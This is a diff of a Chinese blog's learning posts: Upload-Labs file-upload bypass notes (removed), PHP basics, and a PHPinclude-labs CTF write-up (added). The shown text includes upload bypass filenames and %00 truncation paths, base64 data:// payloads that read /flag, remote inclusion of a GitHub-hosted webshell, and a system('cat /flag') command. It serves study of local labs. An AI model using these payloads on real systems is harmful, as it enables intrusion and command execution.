;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+面向对象的部分放在后面写
+类型比较
+注意事项说在前面
+这里我踩了一些坑，刚一开始我用的系统安装的php来跑，发现怎么都得不到想要的flag，后来查询资料得到了原来是因为我安装的php8，版本比较高了，这些都不存在了
+这段代码的关键区别在 $num == 1：PHP 7 会把 &quot;1abc&quot; 转成数字 1；PHP 8 不再这样处理，所以同样的输入在 PHP 7 能得到 flag，在 PHP 8 不能
+所以环境一定要选择对，可以用phpstudy的环境来跑
 
-没有$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
-在windows环境下，不光会自动去除文件末尾的点和空格，同时(::$DATA)这个字符串，windows也会认为是非法字符，默认去除掉
+松散比较：使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型
 
-Pass - 09（黑名单验证，结合绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+严格比较：用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型
+&lt;?phpif(42 == &quot;42&quot;) &#123;    echo &#x27;1、值相等&#x27;;&#125; echo PHP_EOL; // 换行符 if(42 === &quot;42&quot;) &#123;    echo &#x27;2、类型相等&#x27;;&#125; else &#123;    echo &#x27;3、类型不相等&#x27;;&#125;?&gt;
 
-全部都限制了，代码从上往下都执行一下，也就是去.和去空格也是去一下，那么我们多写几个试一下
 
-使用. .绕过
-Pass - 10（黑名单验证·双写绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];        $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;                if (move_uploaded_file($temp_file, $img_path)) &#123;            $is_upload = true;        &#125; else &#123;            $msg = &#x27;上传出错！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+这里让gpt写了一段php代码来学习一下弱类型比较
+&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;PHP 条件判断练习&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form method=&quot;get&quot;&gt;        &lt;label&gt;            输入 num：            &lt;input type=&quot;text&quot; name=&quot;num&quot;&gt;        &lt;/label&gt;        &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;    &lt;/form&gt;    &lt;pre&gt;&lt;?php    if (isset($_GET[&#x27;num&#x27;]) &amp;&amp; is_string($_GET[&#x27;num&#x27;])) &#123;        $num = $_GET[&#x27;num&#x27;];        if (!is_numeric($num)) &#123;            // 将输入作为普通文字显示            echo htmlspecialchars($num, ENT_QUOTES, &#x27;UTF-8&#x27;);            if ($num == 1) &#123;                echo &quot;\nflag&#123;**********&#125;&quot;;            &#125;        &#125;    &#125;    ?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
 
-$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 把file_name中含有deny_ext的那段字符替换成空
-选择双写绕过
-文件名写为shell.pphphp 在上传时，中间的php被替换为了空，然后前面的p和后面的hp 拼接成了php依旧绕过
-Pass - 11（GET 参数 %00 截断）Pass-11 的保存路径来自 GET 参数：
-$img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+如果输入的是单纯一个数字，什么都不会显示
 
-历史 PHP 环境中可以尝试使用空字节截断：
-POST /Pass-11/index.php?save_path=../upload/shell.php%00
+但是如果输入1abc的话，就会直接出flag
 
-如果环境拒绝空字节，通常会返回上传失败；这取决于 PHP、Apache 和底层文件系统版本。
-Pass - 12（POST 参数 %00 截断）Pass-12 与上一关逻辑相同，但保存路径来自 POST 参数：
-实际页面表单使用隐藏的 POST 参数：
-&lt;input type=&quot;hidden&quot; name=&quot;save_path&quot; value=&quot;../upload/&quot;/&gt;
+这里的原理就是源代码中
+if ($num == 1) &#123;               echo &quot;\nflag&#123;**********&#125;&quot;;           &#125;
 
-后端仍然把用户可控的路径和系统生成的文件名拼接起来：
-$img_path = $_POST[&quot;save_path&quot;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+判断一下输入的数字是否和1相等，如果我理解没错的话，要比较的1是一位数组，然后我们输入的是1abc 自动的也就是和第一位的1比较了，然后因为弱类型比较，得到的是true，所以就输出了flag
+超级全局变量PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。
+PHP 超级全局变量列表:
 
-因此在兼容的历史环境中，可以把 save_path 改为带 %00 的路径，例如：
-?save_path=../upload/shell.php%00
+$GLOBALS
 
-如果 PHP 版本足够老且允许空字节截断，拼接后的随机 .jpg 部分可能会被截断，最终写入 shell.php。你当前的 PHP 5.2.17 容器实际测试仍保存成了 .jpg，说明还受到 Web 服务器和请求解析方式影响。Pass-12 的核心问题是：保存目录不应由用户直接控制。
-Pass - 13（文件头检测）Pass-13 读取上传文件的前两个字节判断图片类型：
-function getReailFileType($filename)&#123;    $file = fopen($filename, &quot;rb&quot;);    $bin = fread($file, 2);    fclose($file);    // 根据前两个字节识别 jpg、png、gif&#125;
+$_SERVER
 
-程序只检查文件头，不检查完整图片结构，也不信任用户原始扩展名，而是根据识别结果重新生成 .jpg、.png 或 .gif 文件名。该关的学习重点是文件头检测；若要观察图片内容中的脚本，需要结合题目提供的文件包含漏洞。
-Pass - 14（getimagesize 检测）Pass-14 使用 getimagesize() 判断上传文件是否能被识别为图片：
-$info = getimagesize($filename);$ext = image_type_to_extension($info[2]);
+$_REQUEST
 
-相比只检查文件头，getimagesize() 会进一步解析图片结构。通过后，程序根据识别结果重新生成扩展名，而不是直接采用用户提交的后缀。
-这类检测仍然不是完整的安全方案，因为它只验证图片格式，不会验证文件中是否包含额外内容。Pass-14 同样要求结合题目提供的文件包含漏洞观察图片内容；直接访问上传文件并不会让 Apache 自动执行图片中的 PHP 代码。
-代码中还存在一个值得注意的实现问题：
-if(stripos($types,$ext)&gt;=0)
+$_POST
 
-stripos() 找不到字符串时返回 false，而 false 与 0 比较时容易产生逻辑混淆。更严谨的写法应使用严格比较，并使用数组白名单。
-Pass - 15（EXIF 图片类型检测）Pass-15 使用 exif_imagetype() 判断图片类型：
-$image_type = exif_imagetype($filename);
+$_GET
 
-程序只接受：
-IMAGETYPE_GIFIMAGETYPE_JPEGIMAGETYPE_PNG
+$_FILES
 
-然后将文件重命名为随机名称并使用对应扩展名。相比客户端 MIME 和文件名后缀，EXIF 类型检测更依赖文件实际内容，但它仍然只是图片格式检测，并不能证明文件是安全的图片。
-这一关需要 PHP 的 exif 扩展；如果扩展未启用，exif_imagetype() 可能不可用。实际部署中应同时限制上传目录禁止脚本执行，并将上传文件存放在 Web 根目录之外。
-Pass - 16（二次渲染）Pass-16 会先按文件类型读取图片，然后重新生成一张图片：
-$im = imagecreatefromjpeg($target_path);imagejpeg($im, $img_path);@unlink($target_path);
+$_ENV
 
-PNG 和 GIF 也有对应处理。原始上传文件会被删除，最终只保留 GD 库重新编码后的图片。
-这种方式称为二次渲染或图片重编码。它会丢弃原文件中未参与图片结构的数据，通常可以破坏附加在图片末尾的脚本内容，因此比单纯检查文件头更严格。
-要通过这一关，文件必须是真实且能被 GD 正常解析的图片；仅仅在普通文本前面添加图片头通常会在 imagecreatefrom*() 处失败。二次渲染后的文件仍应放在禁止脚本执行的目录中。
-Pass - 17（先保存后校验，条件竞争）Pass-17 的顺序存在明显问题：
-move_uploaded_file($temp_file, $upload_file);if(in_array($file_ext, $ext_arr))&#123;    rename($upload_file, $img_path);&#125;else&#123;    unlink($upload_file);&#125;
+$_COOKIE
 
-程序先把文件写入上传目录，再检查后缀。非法文件会随后删除，但在“写入”和“删除”之间存在短暂窗口，这属于竞态条件（TOCTOU）问题。
-理论上，如果另一个请求能在这段时间访问该文件，就可能在删除前读取它；实际是否可观察到取决于服务器速度、并发和文件系统，通常需要大量并发请求，结果也不稳定。
-这关的安全重点是校验顺序：应先完成类型、内容和权限校验，确认安全后再写入最终目录；不要把不可信文件先放进可访问的 Web 目录。
-Pass - 18（上传类的白名单校验）Pass-18 使用 MyUpload 类处理文件上传。核心校验包括：
-in_array(strtolower(strrchr($this-&gt;cls_filename, &quot;.&quot;)),         $this-&gt;cls_arr_ext_accepted)
+$_SESSION
+也就是在这些输入点，可能会导致很多的漏洞点，这里借用一下学长总结的表格
 
-允许的扩展名是一个白名单，包含图片、文档和压缩文件等类型；.php 不在白名单中。类还会检查：
 
-是否确实是上传的临时文件；
-上传目录是否可写；
-文件扩展名是否允许；
-文件大小是否超过限制；
-移动文件是否成功；
-是否需要重命名文件。
 
-Pass-18 的关键是白名单校验比黑名单更可靠，但扩展名白名单仍不能替代文件内容检测。允许上传的 HTML、XML、压缩包等文件也可能带来其他风险，因此生产环境应只允许业务真正需要的类型。
-Pass - 19（保存文件名可控）8089 中 Pass-19 允许客户端通过 save_name 指定最终文件名，并用 pathinfo() 检查后缀：
-$file_name = $_POST[&#x27;save_name&#x27;];$file_ext = pathinfo($file_name, PATHINFO_EXTENSION);if (!in_array($file_ext, $deny_ext)) &#123;    move_uploaded_file($temp_file, UPLOAD_PATH . &#x27;/&#x27; . $file_name);&#125;
+变量
+用途
+渗透关注点
 
-源码注释掉了原本的清理逻辑，因此存在大小写、路径和文件名控制问题。能否执行仍取决于 Apache&#x2F;PHP 的解析配置；上传成功不等于 PHP 会执行。
-Pass - 20（数组参数绕过）Pass-20 同时校验上传 MIME、保存文件名后缀，并支持数组形式的 save_name：
-$allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);$file = empty($_POST[&#x27;save_name&#x27;])    ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]    : $_POST[&#x27;save_name&#x27;];if (!is_array($file)) &#123;    $file = explode(&#x27;.&#x27;, strtolower($file));&#125;$ext = end($file);$allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);if (in_array($ext, $allow_suffix)) &#123;    $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];    move_uploaded_file($temp_file, UPLOAD_PATH . &#x27;/&#x27; . $file_name);&#125;
 
-关键点是：普通字符串会先经过 strtolower() 和 explode()，但如果提交的 save_name 是数组，代码会跳过 explode()。随后 end()、reset() 和数组下标操作分别参与后缀判断和最终文件名拼接，因此这是一个 PHP 数组参数类型混淆问题。
-这一关还检查了客户端提交的 MIME 类型；MIME 值本身可被修改，所以不能作为唯一的安全依据。最终文件名仍应使用服务器端生成的安全名称，并结合真实图片内容检测。
-总结文件上传漏洞可能导致：
 
-上传恶意脚本，进一步造成服务器代码执行；
-获取服务器控制权，执行系统命令；
-读取、修改或删除服务器上的敏感文件；
-窃取数据库账号、用户信息和配置文件；
-上传钓鱼页面或恶意文件，影响其他用户；
-覆盖系统文件，造成网站篡改或服务中断；
-利用超大文件或大量文件消耗服务器存储和资源。
+$_GET
+URL 参数
+最常见注入入口
 
-防御方法
 
-在服务端使用白名单，只允许业务需要的文件类型；
-验证真实文件内容，不能只相信扩展名或 MIME 类型；
-由服务器随机生成文件名，禁止用户控制保存路径；
-将上传目录放在 Web 根目录之外，或禁止脚本执行；
-限制文件大小、数量和上传频率；
-对图片进行重新编码或二次渲染；
-先完成校验，再保存到最终目录，避免条件竞争；
-下载文件时设置正确的响应头，防止浏览器执行恶意内容；
-对上传行为记录日志并进行病毒或恶意文件检测。
+$_POST
+POST Body
+表单注入入口
 
-核心原则是：不信任客户端提供的信息，并确保上传文件即使被成功保存，也不能被服务器当作代码执行。
-加后缀file.Php   大小写绕过file.php::$DATAfile.Phpfile.php+file.php.   （多少个 . 都可以）file.php%80-90file.php+file.php.+.+黑名单替换绕过.phphp pfile.pphphp定义不全php、php2、php3、php4、php5、php6、php7、pht、phtm、phtml文件幻术GIF89a?
+
+$_REQUEST
+GET+POST+Cookie
+参数来源混乱，易绕过
+
+
+$_COOKIE
+Cookie
+认证伪造、反序列化
+
+
+$_SESSION
+会话
+会话固定、会话劫持
+
+
+$_SERVER
+服务器信息
+信息泄露、HTTP_* 头伪造
+
+
+$_FILES
+上传文件
+文件上传漏洞
+
+
+$GLOBALS
+全局变量
+变量覆盖
+
+
+
+
+函数PHP中的一些危险函数
+上文中是一些在CTF中出现的一些可能会导致漏洞危险函数
+这里便不再赘述了，因为只学原理不实践的话也没什么意义，所以我选择边实践边学习，遇到了再学
+这里先把extract()学习一下
+extract($_GET)作用是 将GET请求的参数直接解析为变量并覆盖原有变量；
+&lt;?php$flag = &quot;xxxxxxxxxxxx&quot;;extract($_GET);if($secret == &quot;admin&quot;)&#123;echo $flag;&#125;else&#123;echo &quot;Access Denied&quot;;&#125;?&gt;
+
+正常代码无法直接控制 $secret，但是 extract() 会自动创建&#x2F;覆盖任意变量。也就是说：我们在URL传什么参数，服务器就会生成什么变量。
+这里extract接收GET的参数，由于这个函数可以直接覆盖GET到的参数，所以就直接可以在url中加上?secret=admin可以直接覆盖掉原本的参数，直接就可以输出flag
+面向对象可以把它们串成一条线来理解：类定义对象有哪些数据和行为；序列化保存对象的数据；反序列化恢复对象。如果恢复的数据由外部控制，而对象又会自动执行某些操作，就可能产生漏洞。
+这里来学习面向对象,用一下菜鸟教程中的一个汽车的例子
+&lt;?phpclass Car &#123;    public $color;    public function __construct($color = &quot;green&quot;)    &#123;        $this-&gt;color = $color;    &#125;    public function describe()    &#123;        return &quot;汽车的颜色是：&quot; . $this-&gt;color;    &#125;&#125;$car = new Car(&quot;white&quot;);echo $car-&gt;describe();?&gt;
+
+这是程序执行之后的结果
+
+这里开始一段一段的分析代码
+class car  定义一个类car，也就相当于car的设计图
+public $color 在类中声明一个名为 color 的公开属性，用于保存每个对象的颜色,也就相当于规定了在Car中都需要有color（颜色）这个属性，意思就是汽车的设计图中得设计一下颜色
+function describe() 在类中定义的一个方法，这个方法的作用就是描述一下这个车的颜色是什么
+$this 表示目前操作的对象，可能也能想象成英语中的代词哈哈
+$car = new Car(&quot;white&quot;)这个代码很关键，这里原本的含义是new一个新对象,用通俗的话来讲就是让工厂按照 Car 这份设计图，生产一辆新车，并在生产时指定颜色为白色，再用 $car 指代这辆车。
+学习反序列化之前，先学习一下__construct()
+__construct() 魔术方法-构造方法 使用 new 创建对象时，PHP 会自动调用它，用来设置对象的初始状态
+这个可以这样理解
+new Car(&quot;white&quot;)       ↓创建一个 Car 对象       ↓自动调用 __construct(&quot;white&quot;)       ↓参数 $color 得到 &quot;white&quot;       ↓$this-&gt;color = $color       ↓新对象的颜色被设置为 &quot;white&quot;
+
+当然，在类和对象中，这个方法也不是必须有的，下面再看一个例子
+class Car&#123;    public $color;&#125;// 没有构造方法，照样可以创建对象$car = new Car();// 创建后，再设置颜色$car-&gt;color = &quot;white&quot;;echo $car-&gt;color; // 输出 white
+
+如果没有构造方法，只能先创建对象，然后给对象设置颜色，当然这里肯定就不能像有构造方法时候直接在new对象时候传递参数，也就是不能这样$car = new Car(&quot;white&quot;);
+当然，有了构造方法，也可以写多个参数，在这里多设置一个价格，也是可以的
+class Car&#123;    public $color;    public $price;    public function __construct($color,$price)    &#123;        $this-&gt;color = $color;        $this-&gt;price = $price;    &#125;  public function describe()    &#123;        return &quot;汽车的颜色是：&quot; . $this-&gt;color;    &#125;&#125;$car = new Car(&quot;white&quot;,1000);echo $car-&gt;color; // whiteecho $car-&gt;price; // 1000
+
+在这里简单的学完构造方法之后，还有一个自定义的方法function describe()&#96;
+在类和对象中，也可以自定义方法，在这个例子中，describe()就是我们自定义的方法，-&gt; 不仅可以用来引用类中的属性，也可以用来引用方法
+我们自定义的这个方法的含义，在这个car的例子来讲的话，可以通俗的理解为用来描述这个车的颜色
+至此为止，我们用通俗易懂的例子学习了面向对象中的类、对象、属性、方法
+再学一个新概念，继承
+例如，“电动车”也是一种“车”，可以继承 Car
+我们已经有一份汽车设计图 Car，现在想设计电动车，可以在汽车设计图的基础上增加电池等功能，不必从头设计。 这就是继承。
+class ElectricCar extends Car&#123;    public $battery;    public function __construct($color, $price, $battery)    &#123;        parent::__construct($color, $price);        $this-&gt;battery = $battery;    &#125;&#125;
+
+这里：
+
+Car 是父类。
+
+ElectricCar 是子类。
+
+extends 表示继承。
+parent::__construct($color, $price);表示：调用父类的构造方法，让它负责设置颜色和价格。
+
+
+现在电动车不仅有自己的 $battery，还可以使用继承来的公开属性和方法
+$car = new ElectricCar(&quot;white&quot;, 1000, 80);
+
+总结目前php的学习就先到这里，在函数的那个部分，等到在ctf的过程中遇到什么就学什么，然后再来补充
 ]]></content>
       <categories>
         <category>web安全学习</category>
       </categories>
       <tags>
         <tag>Web安全</tag>
-        <tag>文件上传</tag>
-        <tag>Upload-Labs</tag>
+        <tag>CTF</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP 文件包含漏洞学习：伪协议与 CTF+ 实战</title>
+    <url>/2026/11/03/php-file-inclusion-learning/</url>
+    <content><![CDATA[本文整理 PHP 文件包含漏洞的常见函数、伪协议与本地靶场练习，记录 CTF+ PHPinclude-labs 各关卡的分析过程。相关测试仅适用于本地或明确授权的环境。
+
+
+漏洞函数
+
+
+函数名
+功能说明
+
+
+
+include()
+找不到文件时仅抛出警告，脚本继续执行
+
+
+include_once()
+与include()功能一致，但避免重复包含（同一文件仅加载一次）
+
+
+require()
+找不到文件时抛出致命错误，脚本直接停止执行
+
+
+require_once()
+与require()功能一致，且避免重复包含
+
+
+题目来自CTF+ | CTF学习与交流的综合平台
+PHPinclude-labs文件包含漏洞的核心是：程序本来只想加载指定文件，却让用户输入影响了加载哪个文件，而且没有严格限制范围。 攻击者因此可能让程序读取敏感文件，或将不可信文件当作代码执行。
+level1file://伪协议
+
+
+部分
+决定什么
+
+
+
+file://
+从本地文件系统访问文件
+
+
+file_get_contents()
+将内容作为数据读取
+
+
+include &#x2F; require
+包含文件，并解释其中的 PHP 代码
+
+
+include和file://结合起来，file先读取文件，然后include 包含文件，解释PHP代码
+例如存在这样的代码：
+&lt;?phpinclude $_GET[&#x27;page&#x27;];?&gt;
+
+正常情况下，开发者希望用户传入某个页面文件。但用户控制了整个包含目标，因此也可能传入：
+file:///tmp/demo.txt
+
+程序处理过程就是：
+用户提供路径    → include 接收路径    → file:// 定位本地文件    → PHP 加载并解释文件内容
+
+问题出在不可信输入直接决定了包含目标。即使不写 file://，直接传入本地路径也可能存在同样的问题。
+还要结合前面讲过的路径拼接来看：
+include &#x27;pages/&#x27; . $_GET[&#x27;page&#x27;] . &#x27;.php&#x27;;
+
+如果把 file:///tmp/demo.txt 放进这个参数，最终会变成：
+pages/file:///tmp/demo.txt.php
+
+这并不会自动变成一次对 /tmp/demo.txt 的 file:// 访问。分析时必须看拼接后的完整字符串。
+
+传一个GET参数wrappers 那么就构造一下payload
+?wrappers=/flah 直接就看到了flag
+
+level2data:// 伪协议data:// 可以把字符串中的数据当成一个可读取的流，使用它时，内容直接写在地址里，不需要预先创建文件，也不需要访问远程服务器。
+和刚才的 file:// 对照：
+file:///tmp/demo.txt       → 从指定文件取得内容data://text/plain,Hello    → 内容就是地址中的 Hello
+
+常见的两种形式：
+data://text/plain,内容data://text/plain;base64,Base64编码后的内容
+
+Base64 形式也一样：
+echo file_get_contents(&#x27;data://text/plain;base64,SGVsbG8=&#x27;);
+
+SGVsbG8= 解码后的含义就是Hello,然后把Hello 交给了读取函数
+这里用一个只做加法的例子：
+&lt;?php$content = &#x27;&lt;?php echo 1 + 2; ?&gt;&#x27;;$url = &#x27;data://text/plain;base64,&#x27; . base64_encode($content);// 读取：得到 PHP 源码文本echo file_get_contents($url);// 包含：配置允许时，执行其中的 PHP 代码，输出 3include $url;
+
+整个过程就是这样的
+data:// 中的编码数据    → 包装器解码    → 得到 &lt;?php echo 1 + 2; ?&gt;    → include 交给 PHP 解释    → 输出 3
+
+那么现在来看一下这个level2
+
+这里就是用的data://伪协议
+其实上面的include就告诉我了我们应该怎么进行拼接
+我们要穿的参数是&lt;?php echo file_get_contents(&#39;/flag&#39;); ?&gt;
+但是这个参数首先要base64编码一下才可以
+PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKTsgPz4=
+这里来拼接一下;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKTsgPz4=
+然后出现了一个问题
+
+问了ai之后发现这里是因为;被当成了参数分割符号，把这个分号进行url编码一下就是%3B
+那么重新拼接一下参数%3Bbase64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKTsgPz4=
+include成功，得到了flag
+
+level3data:// 伪协议
+代码中有过滤名单,会检查 wrappers 参数，匹配到以下内容就不执行 include：
+
+flag，不区分大小写
+~ ! @ # $ % ^ &amp; * ( ) - _ + = .
+
+那就想办法绕过这个过滤呗，这里还过滤了等号，所以说base64补位的等号不能出现
+&lt;?php readfile(&#x27;/flag&#x27;);
+
+因为php代码最后的?&gt;是可选的，加不加都行
+这个代码base64编码过后是没有🟰的，PD9waHAgcmVhZGZpbGUoJy9mbGFnJyk7
+那么继续拼接wrappers 的参数%3Bbase64,PD9waHAgcmVhZGZpbGUoJy9mbGFnJyk7
+
+level4http://伪协议本地文件包含
+http:// 是一个流包装器，用来把 HTTP 资源当作“文件”读取。它不是把浏览器跳转到该地址，而是由 PHP 服务器主动发起 HTTP 请求，允许 PHP 把一个远程 HTTP 地址当成文件来读取
+echo file_get_contents(&#x27;http://example.com/test.txt&#x27;);
+
+执行流程是：
+PHP 服务器    → 请求 http://example.com/test.txt    ← 接收 HTTP 响应    → 读取响应正文
+
+所以它读取的是远程服务器返回的内容，不是访问者电脑上的文件。
+常见用法：
+$content = file_get_contents(&#x27;http://example.com/a.txt&#x27;);
+
+也可以：
+$fp = fopen(&#x27;http://example.com/a.txt&#x27;, &#x27;r&#x27;);$content = stream_get_contents($fp);fclose($fp);
+
+使用 file_get_contents() 或 fopen() 时，通常需要：
+allow_url_fopen = On
+
+如果用于：
+include(&#x27;http://example.com/a.php&#x27;);
+
+还需要：
+allow_url_include = On
+
+区别在于：
+file_get_contents(&#x27;http://example.com/a.txt&#x27;);
+
+是把远程响应当作数据读取；
+include(&#x27;http://example.com/a.txt&#x27;);
+
+则会把响应内容交给 PHP 的包含机制解析。远程服务器上的 PHP 文件通常会先被远程服务器执行，返回 HTML，因此本地一般拿不到它的 PHP 源码。
+和其他伪协议相比：
+file://  → 读取本地文件data://  → 读取 URL 中直接写入的数据http://  → 通过网络读取远程 HTTP 内容
+
+我们在提示中看到了一个backdoor.txt 
+他的内容是要post ctf的值，这里考虑到给他传一个命令执行的参数，直接cat到flag
+所以要先构造一个http:// 伪协议包含到这个backdoor.txt 让他当php命令执行（这里还没学习到）
+?wrappers=127.0.0.1/backdoor.txt
+然后再进行post ctf 的参数
+ctf=system(&#39;cat /flag&#39;);就得到了flag
+
+链条应该是这样的
+文件包含→ 执行被包含的 PHP 代码→ PHP 代码调用 system/exec 等函数→ 执行操作系统命令
+
+level5http://伪协议远程文件包含
+
+看到提示访问一下challenge.txt 得到了一段php代码
+&lt;?php isset($_GET[&#x27;Key&#x27;])&amp;&amp; 1==2 ? echo &quot;&lt;?= system(&#x27;tac flag.???&#x27;);?&gt;&quot; : die(&#x27;Access Denied&#x27;);?&gt;
+
+这里分析一下这段代码，1==2 永远都是flase，根本不可能绕过
+探姬在远程放了一个木马
+raw.githubusercontent.com/ProbiusOfficial/PHPinclude-labs/main/RFI
+所以直接远程包含这个文件，这个里面有post参数是a，那么直接和上一题一样执行系统命令cat &#x2F;flag
+
+level6php://伪协议
+
+
+包装器
+主要功能
+常见用法
+关键说明
+
+
+
+php://input
+读取 HTTP 请求体的原始内容
+file_get_contents(&#39;php://input&#39;)
+只读；常用于读取 POST 原始数据
+
+
+php://filter
+对其他流进行读取或写入过滤
+php://filter/read=convert.base64-encode/resource=flag.php
+常用于编码、解码、大小写转换和源码读取
+
+
+php://memory
+创建只存在于内存中的临时流
+fopen(&#39;php://memory&#39;, &#39;r+&#39;)
+可读写；每次打开通常是独立流
+
+
+php://temp
+创建临时流，超过限制后可写入临时文件
+fopen(&#39;php://temp&#39;, &#39;r+&#39;)
+默认超过一定大小后使用临时文件
+
+
+php://output
+直接写入 PHP 的输出缓冲
+fwrite(fopen(&#39;php://output&#39;,&#39;w&#39;), &#39;Hi&#39;)
+只写；效果类似输出内容
+
+
+php://stdin
+读取命令行标准输入
+fgets(STDIN)
+主要用于 CLI 命令行程序
+
+
+php://stdout
+写入命令行标准输出
+fwrite(STDOUT, &#39;Hi&#39;)
+主要用于 CLI
+
+
+php://stderr
+写入命令行错误输出
+fwrite(STDERR, &#39;Error&#39;)
+主要用于 CLI 报错或调试
+
+
+php://fd/N
+访问指定的文件描述符
+fopen(&#39;php://fd/3&#39;, &#39;r&#39;)
+N 是操作系统文件描述符编号
+
+
+php://input 表示“当前 HTTP 请求的原始请求体”。
+普通读取方式：
+$body = file_get_contents(&#x27;php://input&#x27;);echo $body;
+
+如果客户端发送：
+POST /index.phpContent-Type: text/plainhello
+
+那么：
+file_get_contents(&#x27;php://input&#x27;)
+
+得到的就是：
+hello
+
+它和 $_POST 的区别是：
+$_POST
+
+读取的是 PHP 解析后的表单参数，而：
+php://input
+
+读取的是原始请求体。
+例如 JSON 请求：
